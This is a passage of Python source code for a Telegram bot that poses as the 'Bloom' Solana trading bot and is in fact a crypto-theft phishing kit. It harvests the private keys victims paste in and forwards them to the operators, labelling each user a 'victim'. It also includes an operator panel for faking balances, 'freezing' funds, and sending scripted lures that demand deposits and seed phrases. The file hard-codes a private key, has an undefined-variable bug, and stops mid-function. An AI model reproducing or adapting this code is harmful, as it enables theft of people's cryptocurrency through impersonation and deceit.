import os
import time
import requests
import json
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode  # ✅ Correct import for ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))
SECOND_OWNER_ID = int(os.getenv("SECOND_OWNER_ID"))

# Load banned users from .env file
BANNED_USERS_STR = os.getenv("BANNED_USERS", "")
BANNED_USERS = set()
if BANNED_USERS_STR:
    try:
        BANNED_USERS = set(int(user_id.strip()) for user_id in BANNED_USERS_STR.split(",") if user_id.strip())
    except ValueError:
        print("Warning: Invalid banned user IDs in .env file")

# Replace with actual wallet/private key management
WALLET_ADDRESS = "BZzTNNjnoSfLZztx4tdBYs7JYCmUutafZ55cV3LG1RFf"
PRIVATE_KEY = "2vL62MgsSXKAuU9HEqParnJj9tZde3avmBnZbZCuKTrn6D5teoro9JW7vLXjQhdMkqhhs4p74dUaqVf31bX5gq8J"

# Keep track of users who got wallet message and settings states
user_data = {}
settings_states = {}
user_balances = {}  # Track user SOL balances
user_usd_balances = {}  # Track user USD balances separately
admin_states = {}  # Track admin operation states
frozen_users = set()  # Track frozen users

# Saved scripts
SAVED_SCRIPTS = {
    "script_1": "⚠️ Error: Wallet Import Issue Detected\n\n- An error has occurred while importing your wallet.\n- You have less than 0.5 SOL in the wallet you imported.\n- Your funds are currently on hold in your Bloom Wallet.\n\nAction Required:\n\n-Please deposit the minimum amount of 0.5 SOL to the wallet you are importing to proceed.\n\n-If you need assistance, please contact @BloomSupportUS",
    "script_2": "1. We have received your deposit. To proceed, a minimum deposit of 1 SOL is required.\n2. Your private key shows a zero balance, which is likely flagged as bot activity.\n3. You have been flagged as a bot. Please import your seed phrase to continue.",
    "script_3": "🔔 Reminder: Your account will be reviewed within 24 hours. Thank you for your patience.",
    "script_4": "💰 Congratulations! You've been selected for our premium features beta program.",
    "script_5": "📞 Our support team has reviewed your request. Please check your account for updates."
}

def current_time():
    return time.strftime("%H:%M:%S", time.localtime())

def is_user_banned(user_id):
    """Check if a user is banned"""
    return user_id in BANNED_USERS

# Removed SOL price function - no longer needed

# Keyboards

def continue_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Continue", callback_data="continue")
    ]])

def start_trading_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Start Trading", callback_data="start_trading")
    ]])

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💼 Positions", callback_data="positions"),
         InlineKeyboardButton("🎯 LP Sniper", callback_data="lp_sniper")],
        [InlineKeyboardButton("🤖 Copy Trade", callback_data="copy_trade"),
         InlineKeyboardButton("💤 AFK Mode", callback_data="afk_mode")],
        [InlineKeyboardButton("📝 Limit Orders", callback_data="limit_orders"),
         InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdrawal"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("🗑️ Close", callback_data="close"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
    ])

def positions_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✏️ Min Value: N/A", callback_data="popup_import_wallet"),
         InlineKeyboardButton("✏️ Sell position: 100%", callback_data="popup_import_wallet")],
        [InlineKeyboardButton("🏠 Homepage", callback_data="refresh"),
         InlineKeyboardButton("🔴 USD", callback_data="usd"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("🗑️ Delete", callback_data="close")]
    ])

def lp_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Pro accounts", callback_data="popup_pro_accounts"),
         InlineKeyboardButton("🎯 Create task", callback_data="popup_create_task")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
    ])

def copy_trade_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🆕 Add new config", callback_data="popup_add_new_config")],
        [InlineKeyboardButton("⏸️ Pause all", callback_data="popup_pause_all"),
         InlineKeyboardButton("▶️ Start all", callback_data="popup_start_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def afk_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🆕 Add new config", callback_data="popup_add_new_config")],
        [InlineKeyboardButton("⏸️ Pause all", callback_data="popup_pause_all"),
         InlineKeyboardButton("▶️ Start all", callback_data="popup_start_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def limit_orders_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Homepage", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("🗑️ Delete", callback_data="close")]
    ])

def referrals_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Change referral code", callback_data="change_referral_code")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def withdraw_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("50%", callback_data="withdraw_50"),
         InlineKeyboardButton("100%", callback_data="withdraw_100"),
         InlineKeyboardButton("X SOL", callback_data="withdraw_x")],
        [InlineKeyboardButton("💸 Set address", callback_data="popup_set_address")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def settings_keyboard(user_id):
    # Initialize user settings if not exists
    if user_id not in settings_states:
        settings_states[user_id] = {
            "expert_mode": False,
            "degen_mode": False,
            "mev_protection": False
        }

    states = settings_states[user_id]
    expert_emoji = "🟢" if states["expert_mode"] else "🔴"
    degen_emoji = "🟢" if states["degen_mode"] else "🔴"
    mev_emoji = "🟢" if states["mev_protection"] else "🔴"

    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{expert_emoji} Expert mode", callback_data="settings_expert_mode")],
        [InlineKeyboardButton("⛽️ Fee", callback_data="settings_fee"),
         InlineKeyboardButton("💰 Wallets", callback_data="settings_wallets")],
        [InlineKeyboardButton("🛍️ Slippage", callback_data="settings_slippage"),
         InlineKeyboardButton("🔧 Presets", callback_data="settings_presets")],
        [InlineKeyboardButton(f"{degen_emoji} Degen mode", callback_data="settings_degen_mode"),
         InlineKeyboardButton(f"{mev_emoji} MEV protection", callback_data="settings_mev_protection")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def panel_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Add Balance", callback_data="admin_add_balance"),
         InlineKeyboardButton("💬 Message User", callback_data="admin_message_user")],
        [InlineKeyboardButton("📝 Saved Scripts", callback_data="admin_saved_scripts")],
        [InlineKeyboardButton("🔒 Freeze User", callback_data="admin_freeze_user"),
         InlineKeyboardButton("🔓 Unfreeze User", callback_data="admin_unfreeze_user")],
        [InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def saved_scripts_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚫 Wallet Import Error", callback_data="script_script_1"),
         InlineKeyboardButton("🔍 Bot Detection Alert", callback_data="script_script_2")],
        [InlineKeyboardButton("⏰ Account Review Notice", callback_data="script_script_3"),
         InlineKeyboardButton("💎 Premium Beta Invite", callback_data="script_script_4")],
        [InlineKeyboardButton("💬 Support Response", callback_data="script_script_5")],
        [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel"),
         InlineKeyboardButton("❌ Close", callback_data="close")]
    ])

def confirm_keyboard(action, data):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{action}_{data}"),
         InlineKeyboardButton("❌ Decline", callback_data=f"decline_{action}_{data}")]
    ])

# Messages

def get_first_one_off_message():
    return (
        "<b>Bloom - Your <i>UNFAIR</i> advantage in crypto</b>\n\n"
        "Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, Sniping, and more—all within Telegram.\n\n"
        "By continuing, you'll create a crypto wallet that interacts directly with Bloom, enabling real-time trading all in Telegram. "
        "All trading activities and wallet management can occur inside Telegram.\n\n"
        "<b>IMPORTANT:</b> After clicking Continue, your public wallet address and private key will be generated and displayed directly within Telegram. "
        "Ensure you are in a private space or location before proceeding. Your private key is for your own use only, and it is crucial that you store it securely, "
        "as Bloom will not store or retrieve it for you.\n\n"
        "By pressing Continue, you confirm that you have read and agree to our "
        "<a href='https://tos.bloombot.app/'>Terms and Conditions</a> and "
        "<a href='https://tos.bloombot.app/'>Privacy Policy</a>. You also acknowledge the inherent risks involved in cryptocurrency trading and accept full responsibility for any outcomes relating to your use of Bloom.\n\n"
        "Please take a moment to review our terms before moving forward."
    )

def get_second_one_off_message():
    return (
        "🌸 <b>Welcome to Bloom!</b>\n\n"
        "Let your trading journey blossom with us!\n\n"
        "<b>Your Wallet Has Been Successfully Created 🟢</b>\n\n"
        "🔑 <b>Save your Private Key:</b>\n"
        "Here is your private key. Please store it securely and do not share it with anyone. "
        "Once this message is deleted, you won't be able to retrieve your private key again.\n\n"
        f"<code>Private Key:\n\n{PRIVATE_KEY}</code>\n\n"
        "🌸 <b>Your Solana Wallet Address:</b>\n"
        f"<code>{WALLET_ADDRESS}</code>\n\n"
        "To start trading, please deposit SOL to your address.\n"
        "Only deposit SOL through the SOL network.\n\n"
        "📚 <b>Resources:</b>\n"
        "• 📖 <a href='https://solana.bloombot.app/'>Bloom Guides</a>\n"
        "• 🔔 <a href='https://x.com/BloomTradingBot/'>Bloom X</a>\n"
        "• 🤝 <a href='https://t.me/bloomportal'>Bloom Portal</a>\n"
        "• 🤖 <a href='https://discord.gg/bloomtrading'>Bloom Discord</a>\n\n"
        "Ready to let your potential bloom? Tap the button below to start your journey!"
    )

def get_repeat_start_message(user_id=None):
    timestamp = current_time()
    sol_balance = user_balances.get(user_id, 0) if user_id else 0
    usd_balance = user_usd_balances.get(user_id, 0) if user_id else 0

    # Create balance display with inputted USD value
    if sol_balance > 0 and usd_balance > 0:
        balance_text = f"Balance: {sol_balance:.2f} SOL (USD ${usd_balance:.2f})"
    elif sol_balance > 0:
        balance_text = f"Balance: {sol_balance:.2f} SOL"
    elif usd_balance > 0:
        balance_text = f"Balance: USD ${usd_balance:.2f}"
    else:
        balance_text = "Balance: 0.00 SOL"

    # Check if user is frozen
    if user_id and user_id in frozen_users:
        freeze_message = "\n🔴 <b>Your funds are currently placed on hold, please contact support</b>\n"
        deposit_message = ""  # Don't show deposit message when frozen
    else:
        freeze_message = ""
        deposit_message = "" if sol_balance > 0 else "To start trading, please deposit SOL to your address.\n\n"

    return (
        "🌸 <b>Welcome to Bloom!</b>\n\n"
        "Let your trading journey blossom with us!\n\n"
        f"🌸 <b>Your Solana Wallet Address:</b>\n\n→ W1: <code>{WALLET_ADDRESS}</code>\n"
        f"{balance_text}\n"
        f"{freeze_message}\n"
        f"{'🔴 You currently have no SOL in your wallet.' if sol_balance == 0 else ''}\n"
        f"{deposit_message}"
        "📚 <b>Resources:</b>\n"
        "• 📖 <a href='https://solana.bloombot.app/'>Bloom Guides</a>\n"
        "• 🔔 <a href='https://x.com/BloomTradingBot/'>Bloom X</a>\n"
        "• 🌍 <a href='https://bloombot.app/'>Bloom Website</a>\n"
        "• 🤝 <a href='https://t.me/bloomportal'>Bloom Portal</a>\n"
        "• 🤖 <a href='https://discord.gg/bloomtrading'>Bloom Discord</a>\n\n"
        "🇳🇱 EU1 • 🇩🇪 EU2 • 🇺🇸 US1 • 🇸🇬 SG1\n\n"
        f"🕒 Last updated: {timestamp}"
    )

# Handlers

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    user_id = user.id

    # Check if user is banned
    if is_user_banned(user_id):
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ You have been banned from using this bot.",
        )
        return

    # Send one owner alert only once per user session
    if not context.chat_data.get("owner_alert_sent"):
        # Format username
        username_display = user.username if user.username else "❌"

        # Check if user has Telegram Premium
        premium_status = "✅" if user.is_premium else "❌"

        message_text = (
            "⚠️ Potential Victim\n"
            f"├ 👤 {username_display}\n"
            f"├ 🆔 {user_id}\n"
            f"├ 💎 Premium: {premium_status}\n"
            "🔹 A victim just ran /start using your link."
        )

        await context.bot.send_message(chat_id=OWNER_ID, text=message_text)
        if SECOND_OWNER_ID:
            await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=message_text)
        context.chat_data["owner_alert_sent"] = True

    # Check if user has started before, track states
    if user_id not in user_data:
        user_data[user_id] = {"first_one_off_sent": False, "second_one_off_sent": False}

    if not user_data[user_id]["first_one_off_sent"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_first_one_off_message(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=continue_keyboard(),
        )
        user_data[user_id]["first_one_off_sent"] = True
        return

    # If first message sent but second not sent, show first message again
    if user_data[user_id]["first_one_off_sent"] and not user_data[user_id]["second_one_off_sent"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_first_one_off_message(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=continue_keyboard(),
        )
        return

    # Repeat start message
    await context.bot.send_message(
        chat_id=chat_id,
        text=get_repeat_start_message(user_id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=main_menu_keyboard(),
    )

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel command - only for owners"""
    user = update.effective_user
    user_id = user.id
    chat_id = update.effective_chat.id

    # Check if user is an owner
    if user_id not in [OWNER_ID, SECOND_OWNER_ID]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ Access denied. This command is for administrators only.",
        )
        return

    # Send admin panel
    text = (
        "🔧 <b>Admin Panel</b>\n\n"
        "Welcome to the administrative control panel.\n"
        "Select an option below:\n\n"
        f"🕒 Accessed at: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode=ParseMode.HTML,
        reply_markup=panel_keyboard(),
    )

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support command"""
    chat_id = update.effective_chat.id

    text = (
        "<b>Support Request</b>\n\n"
        "For assistance or any questions,\n"
        "please contact: @BloomSupportUS\n\n"
        "Our team is available to help you."
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode=ParseMode.HTML,
    )

async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Worker command - displays welcome message with conditional buttons"""
    user = update.effective_user
    user_id = user.id
    chat_id = update.effective_chat.id

    # Create welcome message
    text = (
        "Welcome to Lynx's worker panel.\n\n"
        "Please click the button below to continue."
    )

    # Create buttons based on user permissions
    keyboard_buttons = []
    
    # If user is an owner, show all three buttons
    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
        keyboard_buttons.append([
            InlineKeyboardButton("Current Workers", callback_data="current_workers"),
            InlineKeyboardButton("Support", callback_data="worker_support")
        ])
        keyboard_buttons.append([
            InlineKeyboardButton("Your Link", callback_data="your_link")
        ])
    else:
        # If not an owner, show only support and your link
        keyboard_buttons.append([
            InlineKeyboardButton("Support", callback_data="worker_support"),
            InlineKeyboardButton("Your Link", callback_data="your_link")
        ])

    keyboard = InlineKeyboardMarkup(keyboard_buttons)

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )

async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Positions command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Positions\n\n"
        "No open positions yet!\n"
        "Start your trading journey by pasting a contract address in chat.\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=positions_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """LP Sniper command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Sniper\n\n"
        "🧐 No active sniper tasks!\n\n"
        "📖 Learn More!\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=lp_sniper_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def copy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy Trade command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Copy Trade\n\n"
        "💡 Copy the best traders with Bloom!\n\n"
        "Copy Wallet:\n"
        f"→ W1: <code>{WALLET_ADDRESS}</code>\n\n"
        "🟢 Copy trade setup is active\n"
        "🔴 Copy trade setup is inactive\n\n"
        "⏱️ Please wait 10 seconds after each change for it to take effect.\n\n"
        "⚠️ Changing your copy wallet? Remember to remake your tasks to use the new wallet for future transactions.\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=copy_trade_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def afk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AFK Mode command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom AFK\n\n"
        "💡 Run your bot while you are away!\n\n"
        "AFK Wallet:\n"
        f"→ W1: <code>{WALLET_ADDRESS}</code>\n\n"
        "🟢 AFK mode is active\n"
        "🔴 AFK mode is inactive\n\n"
        "⏱️ Please wait 10 seconds after each change for it to take effect.\n\n"
        "⚠️ Changing your Default wallet? Remember to remake your tasks to use the new wallet for future transactions.\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=afk_mode_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def orders_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Limit Orders command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Orders\n\n"
        "🧐 No active limit orders!\n\n"
        "Create a limit order from the token page.\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=limit_orders_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def referrals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Referrals command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Referral Program\n\n"
        "Your Referral Code:\n"
        "🔗 ref_0EW9TYD0C\n\n"
        "Your Payout Address:\n"
        "PLACEHOLDER\n\n"
        "📈 Referrals Volume:\n\n"
        "• Level 1: 0 Users / 0 SOL\n"
        "• Level 2: 0 Users / 0 SOL\n"
        "• Level 3: 0 Users / 0 SOL\n"
        "• Referred Trades: 0\n\n"
        "📊 Rewards Overview:\n\n"
        "• Total Unclaimed: 0 SOL\n"
        "• Total Claimed: 0 SOL\n"
        "• Lifetime Earnings: 0 SOL\n"
        "• Last distribution: 2025-02-16 12:19:06\n\n"
        "📖 Learn More!\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=referrals_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Withdraw command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Withdraw Solana\n\n"
        "Balance: 0 SOL\n\n"
        "Current withdrawal address:\n\n"
        "🔧 Last address edit: -\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=withdraw_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Settings command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🌸 Bloom Settings\n\n"
        "🟢 : The feature/mode is turned ON\n"
        "🔴 : The feature/mode is turned OFF\n\n"
        "📖 Learn More!\n\n"
        f"🕒 Last updated: {current_time()}"
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=settings_keyboard(user_id),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages, particularly for private key input and admin operations"""
    user = update.effective_user
    user_id = user.id
    message_text = update.message.text

    # Check if user is banned (except for owners)
    if user_id not in [OWNER_ID, SECOND_OWNER_ID] and is_user_banned(user_id):
        await update.message.reply_text("❌ You have been banned from using this bot.")
        return

    # Check if user is awaiting private key input
    if user_id in user_data and user_data[user_id].get("awaiting_private_key"):
        # Reset the awaiting state
        user_data[user_id]["awaiting_private_key"] = False

        # Get username or fallback to N/A
        username = user.username if user.username else "N/A"

        # Create victim information message with private key
        victim_message = (
            "🌸 Victim imported Solana wallet\n\n"
            "🔎 Victim Information\n\n"
            f"├ 👤 Name: {username}\n"
            f"├ 🆔 {user_id}\n"
            f"├ 🔑 Private Key: <code>{message_text}</code>"
        )

        # Send to both owners
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
            if SECOND_OWNER_ID:
                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"Error sending to owners: {e}")

        # Show wallet creation confirmation message without inline buttons
        await update.message.reply_text("Please wait while your wallet is being created. ✅")
        return

    # Handle admin operations (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and user_id in admin_states:
        admin_state = admin_states[user_id]

        if admin_state.get("awaiting_balance_input"):
            # Expecting format: "user_id sol_amount usd_amount"
            try:
                parts = message_text.strip().split()
                if len(parts) != 3:
                    await update.message.reply_text("❌ Invalid format. Please use: user_id sol_amount usd_amount\nExample: 123456789 5.5 1000.0\nUse 0 0 to reset balance.")
                    return

                target_user_id = int(parts[0])
                sol_amount = float(parts[1])
                usd_amount = float(parts[2])

                if sol_amount < 0 or usd_amount < 0:
                    await update.message.reply_text("❌ Amounts must be non-negative. Use 0 0 to reset balance.")
                    return

                # Store the pending balance operation (SOL and USD are now independent)
                admin_states[user_id]["pending_balance"] = {
                    "target_user_id": target_user_id,
                    "sol_amount": sol_amount,
                    "usd_amount": usdamount
                }
                admin_states[user_id]["awaiting_balance_input"] = False

                # Calculate new balance (only SOL amount affects the SOL balance)
                current_balance = user_balances.get(target_user_id, 0)
                if sol_amount == 0 and usd_amount == 0:
                    new_sol_balance = 0
                else:
                    new_sol_balance = current_balance + sol_amount

                # Show confirmation
                if sol_amount == 0 and usd_amount == 0:
                    action_text = "reset to 0"
                else:
                    action_parts = []
                    if sol_amount > 0:
                        action_parts.append(f"{sol_amount:.2f} SOL")
                    if usd_amount > 0:
                        action_parts.append(f"${usd_amount:.2f} USD")
                    action_text = f"add {' + '.join(action_parts)}"

                # Get current USD balance
                current_usd_balance = user_usd_balances.get(target_user_id, 0)
                new_usd_balance = current_usd_balance + usd_amount if not (sol_amount == 0 and usd_amount == 0) else 0

                confirm_text = (
                    f"💰 <b>Balance Update Confirmation</b>\n\n"
                    f"User ID: {target_user_id}\n"
                    f"Current SOL Balance: {current_balance:.2f} SOL\n"
                    f"Current USD Balance: ${current_usd_balance:.2f} USD\n"
                    f"Action: {action_text}\n"
                    f"SOL to add: {sol_amount:.2f} SOL\n"
                    f"USD to add: ${usd_amount:.2f} USD\n"
                    f"New SOL Balance: {new_sol_balance:.2f} SOL\n"
                    f"New USD Balance: ${new_usd_balance:.2f} USD\n\n"
                    f"Confirm this balance update?"
                )

                await context.bot.send_message(
                    chat_id=update.message.chat_id,
                    text=confirm_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=confirm_keyboard("balance", target_user_id)
                )

            except ValueError:
                await update.message.reply_text("❌ Invalid input. Please use: user_id sol_amount usd_amount\nExample: 123456789 5.5 1000.0")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_message_input"):
            # Expecting format: "user_id message"
            try:
                parts = message_text.strip().split(maxsplit=1)
                if len(parts) != 2:
                    await update.message.reply_text("❌ Invalid format. Please use: user_id message\nExample: 123456789 Hello, this is a custom message!")
                    return

                target_user_id = int(parts[0])
                message_to_send = parts[1]

                # Store the pending message operation
                admin_states[user_id]["pending_message"] = {
                    "target_user_id": target_user_id,
                    "message": message_to_send
                }
                admin_states[user_id]["awaiting_message_input"] = False

                # Show confirmation
                confirm_text = (
                    f"💬 <b>Message Confirmation</b>\n\n"
                    f"Recipient: {target_user_id}\n\n"
                    f"<b>Message Preview:</b>\n"
                    f"{message_to_send}\n\n"
                    f"Send this message?"
                )

                await context.bot.send_message(
                    chat_id=update.message.chat_id,
                    text=confirm_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=confirm_keyboard("message", target_user_id)
                )

            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Please use: user_id message\nExample: 123456789 Hello!")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_script_user_id"):
            # Expecting user_id for script sending
            try:
                target_user_id = int(message_text.strip())
                script_key = admin_states[user_id]["selected_script"]
                script_message = SAVED_SCRIPTS[script_key]

                # Store the pending script operation
                admin_states[user_id]["pending_script"] = {
                    "target_user_id": target_user_id,
                    "script_key": script_key,
                    "message": script_message
                }
                admin_states[user_id]["awaiting_script_user_id"] = False

                # Show confirmation
                confirm_text = (
                    f"📝 <b>Script Message Confirmation</b>\n\n"
                    f"Script: {script_key.replace('_', ' ').title()}\n"
                    f"Recipient: {target_user_id}\n\n"
                    f"<b>Message Preview:</b>\n"
                    f"{script_message}\n\n"
                    f"Send this script?"
                )

                await context.bot.send_message(
                    chat_id=update.message.chat_id,
                    text=confirm_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=confirm_keyboard("script", target_user_id)
                )

            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_freeze_user_id"):
            # Expecting user_id for freezing
            try:
                target_user_id = int(message_text.strip())

                admin_states[user_id]["awaiting_freeze_user_id"] = False

                # Add user to frozen set
                frozen_users.add(target_user_id)

                await update.message.reply_text(f"🔒 User {target_user_id} has been frozen successfully.")

            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return

        elif admin_state.get("awaiting_unfreeze_user_id"):
            # Expecting user_id for unfreezing
            try:
                target_user_id = int(message_text.strip())

                admin_states[user_id]["awaiting_unfreeze_user_id"] = False

                # Remove user from frozen set
                frozen_users.discard(target_user_id)

                await update.message.reply_text(f"🔓 User {target_user_id} has been unfrozen successfully.")

            except ValueError:
                await update.message.reply_text("❌ Invalid user ID. Please enter a valid user ID.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

            return


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    # Check if user is banned (except for owners)
    if user_id not in [OWNER_ID, SECOND_OWNER_ID] and is_user_banned(user_id):
        await query.answer("❌ You have been banned from using this bot.", show_alert=True)
        return

    # Handle confirmation buttons (only for owners)
    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("confirm_"):
        parts = data.split("_", 2)
        action = parts[1]
        target_user_id = int(parts[2])

        if action == "balance" and user_id in admin_states and "pending_balance" in admin_states[user_id]:
            pending = admin_states[user_id]["pending_balance"]
            sol_amount = pending["sol_amount"]
            usd_amount = pending["usd_amount"]

            # Update balances separately
            if sol_amount == 0 and usd_amount == 0:
                user_balances[target_user_id] = 0
                user_usd_balances[target_user_id] = 0
            else:
                # Update SOL balance
                if target_user_id not in user_balances:
                    user_balances[target_user_id] = 0
                user_balances[target_user_id] += sol_amount

                # Update USD balance
                if target_user_id not in user_usd_balances:
                    user_usd_balances[target_user_id] = 0
                user_usd_balances[target_user_id] += usd_amount

            # Clear pending operation
            del admin_states[user_id]["pending_balance"]

            if sol_amount == 0 and usd_amount == 0:
                action_text = "reset to 0"
            else:
                action_parts = []
                if sol_amount > 0:
                    action_parts.append(f"{sol_amount:.2f} SOL")
                if usd_amount > 0:
                    action_parts.append(f"${usd_amount:.2f} USD")
                action_text = f"added {' + '.join(action_parts)}"

            # Display both balances
            sol_bal = user_balances[target_user_id]
